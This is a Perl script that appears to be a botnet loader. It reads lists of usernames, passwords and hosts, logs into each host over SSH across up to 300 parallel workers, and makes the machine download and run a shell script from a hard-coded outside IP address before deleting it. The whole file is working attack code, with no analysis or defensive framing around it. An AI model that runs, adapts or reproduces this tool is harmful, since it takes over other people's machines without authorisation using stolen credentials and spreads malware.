#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
#
# __________        __ /\_______________  ___
# \______   \ _____/  |)/\_   _____/\   \/  /
#  |    |  _//  _ \   __\ |    __)_  \     / 
#  |    |   (  <_> )  |   |        \ /     \ 
#  |______  /\____/|__|  /_______  //___/\  \
#         \/                     \/       \_/
#
open(fh,'<',$ARGV[0]); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 workers
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a worker
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('wget http://159.253.7.22/getbinaries.sh -O /tmp/getbinaries.sh; sh /tmp/getbinaries.sh; rm /tmp/getbinaries.sh');
                        sleep 10;
                        $channel->close;
                        print "\e[32;1mCommand Sent To --> ".$newarray[$c]."\n";
                } else {
                        print "\e[0;34mCan't Authenticate Host $newarray[$c]\n";
                }
        } else {
                print "\e[1;31;1mCant Connect To Host $newarray[$c]\n";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;

